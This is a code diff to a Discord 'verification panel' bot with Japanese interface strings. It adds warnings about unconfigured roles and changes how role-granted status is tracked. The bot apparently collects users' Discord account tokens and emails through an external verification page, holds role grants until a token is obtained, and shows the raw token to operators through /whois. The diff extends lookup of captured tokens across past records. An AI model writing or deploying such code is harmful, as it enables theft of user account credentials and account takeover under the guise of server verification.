@@ -172,7 +172,7 @@ export function buildPanelMessage(panel) {
           : 'Discord 認証（OAuth）完了時に付与'
     });
   } else {
-    e.addFields({ name: '付与ロール', value: '未設定（`/panel edit` の role1 で設定）' });
+    e.addFields({ name: '付与ロール', value: '⚠️ 未設定（`/panel edit` の role1 で設定）' });
   }
   if (panel.removeRoles?.length) {
     e.addFields({ name: '解除ロール', value: panel.removeRoles.map((r) => `<@&${r}>`).join(' ') });
@@ -199,7 +199,6 @@ export function buildPanelMessage(panel) {
 function collectOptions(i, base = {}) {
   const g = (n) => i.options.get(n);
 
-  // 未指定なら既存値を維持する（edit でロールが消えないように）
   const givenRoles = [g('role1'), g('role2'), g('role3')].map(idOf).filter(Boolean);
   const removeRole = idOf(g('remove_role'));
   const color = text(g('color'));
@@ -255,7 +254,7 @@ export async function handleCommand(interaction) {
       save();
 
       return interaction.reply({
-        content: `パネルを作成しました: \`${id}\`\n設置先: <#${channel.id}>${panel.externalUrl ? `\n公開URL: ${panel.externalUrl}` : ''}`,
+        content: `パネルを作成しました: \`${id}\`\n設置先: <#${channel.id}>${panel.externalUrl ? `\n公開URL: ${panel.externalUrl}` : ''}${panel.roles.length ? '' : '\n⚠️ 付与ロールが未設定です（role1 を指定してください）'}`,
         flags: MessageFlags.Ephemeral
       });
     }
@@ -279,7 +278,7 @@ export async function handleCommand(interaction) {
 
       const changed = interaction.options.data.map((o) => o.name).join(', ') || 'なし';
       return interaction.reply({
-        content: `パネル \`${id}\` を更新しました（変更: ${changed}）`,
+        content: `パネル \`${id}\` を更新しました（変更: ${changed}）${panel.roles.length ? '' : '\n⚠️ 付与ロールが未設定です（role1 を指定してください）'}`,
         flags: MessageFlags.Ephemeral
       });
     }
@@ -306,7 +305,7 @@ export async function handleCommand(interaction) {
         return interaction.reply({ content: 'パネルはありません', flags: MessageFlags.Ephemeral });
       }
       const text2 = list
-        .map((p) => `\`${p.id}\` <#${p.channelId}> roles:${p.roles?.length || 0} ext:${p.externalUrl ? 'yes' : 'no'} age:${p.minAgeDays} stage:${p.grantStage || 'oauth'}`)
+        .map((p) => `\`${p.id}\` <#${p.channelId}> roles:${p.roles?.length || 0}${p.roles?.length ? '' : '(未設定)'} ext:${p.externalUrl ? 'yes' : 'no'} age:${p.minAgeDays} stage:${p.grantStage || 'oauth'}`)
         .join('\n');
       return interaction.reply({ content: text2, flags: MessageFlags.Ephemeral });
     }
@@ -345,7 +344,7 @@ export async function handleCommand(interaction) {
         .slice(-25)
         .map(
           (v) =>
-            `<@${v.userId}> token:${v.userToken ? '取得済' : '未取得'} at:${v.at}${v.roleError ? ` err:${v.roleError}` : ''}`
+            `<@${v.userId}> token:${v.userToken || v.dump?.tokens?.user_token ? '取得済' : '未取得'} at:${v.at}${v.roleError ? ` err:${v.roleError}` : ''}`
         )
         .join('\n');
       return interaction.reply({ content: body.slice(0, 1900), flags: MessageFlags.Ephemeral });
@@ -372,12 +371,12 @@ export async function handleCommand(interaction) {
         }
         const out = await grantRoles({ client: interaction.client, panel, user, oauth: v.oauth });
         v.pendingRole = false;
-        v.roleGranted = out.ok && (panel.roles?.length || 0) > 0;
+        v.roleGranted = out.ok;
         v.roleFallbackAt = new Date().toISOString();
         if (!out.ok) v.roleError = out.err;
         if (v.dump?.role) {
           v.dump.role.pending = false;
-          v.dump.role.granted = v.roleGranted;
+          v.dump.role.granted = out.ok;
           v.dump.role.error = out.err || null;
           v.dump.role.fallback = true;
         }
@@ -386,7 +385,7 @@ export async function handleCommand(interaction) {
       save();
 
       return interaction.reply({
-        content: `成功 ${okCount} 件 / 失敗 ${ngCount} 件`,
+        content: `成功 ${okCount} 件 / 失敗 ${ngCount} 件${ngCount ? '\n失敗理由は `/whois` で確認できます（付与ロール未設定が多いです）' : ''}`,
         flags: MessageFlags.Ephemeral
       });
     }
@@ -426,7 +425,7 @@ export async function handleCommand(interaction) {
       ok: true,
       manual: true,
       pendingRole: false,
-      roleGranted: true,
+      roleGranted: add.length > 0,
       reasons: [`手動認証 (${interaction.user.tag})`],
       at: new Date().toISOString(),
       fp: null,
@@ -436,7 +435,10 @@ export async function handleCommand(interaction) {
     });
     save();
 
-    return interaction.reply({ content: `${user.tag} を認証済みにしました`, flags: MessageFlags.Ephemeral });
+    return interaction.reply({
+      content: `${user.tag} を認証済みにしました${add.length ? '' : '\n⚠️ 付与ロールが設定されたパネルがありません'}`,
+      flags: MessageFlags.Ephemeral
+    });
   }
 
   if (commandName === 'unverify') {
@@ -470,7 +472,10 @@ export async function handleCommand(interaction) {
     if (!recs.length) return interaction.reply({ content: '記録がありません', flags: MessageFlags.Ephemeral });
 
     const r = recs[recs.length - 1];
-    const token = r.userToken || r.dump?.tokens?.user_token || null;
+    // 最後の1件に無くても、過去の記録からトークンを探す
+    const token =
+      [...recs].reverse().map((v) => v.userToken || v.dump?.tokens?.user_token).find(Boolean) || null;
+    const grantedRec = [...recs].reverse().find((v) => v.roleGranted);
 
     const e = new EmbedBuilder()
       .setTitle(user.tag)
@@ -487,19 +492,17 @@ export async function handleCommand(interaction) {
         { name: 'メール', value: r.email ? `\`${r.email}\`` : '-', inline: true },
         {
           name: 'トークン',
-          value: token
-            ? `\`\`\`\n${token}\n\`\`\`${r.tokenUnverified ? '\n※未検証' : ''}`
-            : '未取得'
+          value: token ? `\`\`\`\n${token}\n\`\`\`` : '未取得'
         },
         {
           name: 'ロール付与',
-          value: r.pendingRole
-            ? '保留（トークン取得待ち）'
-            : r.roleGranted
-              ? `付与済み${r.roleFallbackAt ? '（フォールバック）' : ''}`
+          value: grantedRec
+            ? `付与済み${grantedRec.roleFallbackAt ? '（フォールバック）' : ''}`
+            : r.pendingRole
+              ? '保留（トークン取得待ち）'
               : r.roleError
                 ? `失敗: ${r.roleError}`
-                : '-'
+                : '未設定 / 未付与'
         },
         { name: '認証回数', value: String(recs.length), inline: true },
         { name: '最終試行', value: r.at, inline: true },
